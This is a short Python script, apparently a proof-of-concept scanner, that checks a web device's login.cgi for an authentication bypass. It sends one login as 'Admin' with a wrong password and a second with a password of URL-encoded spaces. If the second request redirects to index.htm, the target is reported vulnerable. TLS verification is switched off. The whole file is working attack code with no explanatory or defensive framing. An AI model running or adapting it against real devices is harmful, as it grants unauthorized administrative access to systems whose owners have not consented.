import requests,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r1=randomLowercase(8)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"login.cgi"
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded',
	}
	body=f'username=Admin&password=asdkladk&submit.htm%3Flogin.htm='
	response=requests.post(url, body,headers=headers,verify=False,timeout=8)
	if "window.location.href='login.htm" in response.text:
		s0=True
	else:
		s0=False
	url=baseurl+"login.cgi"
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded',
	}
	body=f'username=Admin&password=%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&submit.htm%3Flogin.htm='
	response=requests.post(url, body,headers=headers,verify=False,timeout=8)
	if "window.location.href='index.htm" in response.text:
		s1=True
	else:
		s1=False
	if s0 and s1:
		return True
	else:
		return False
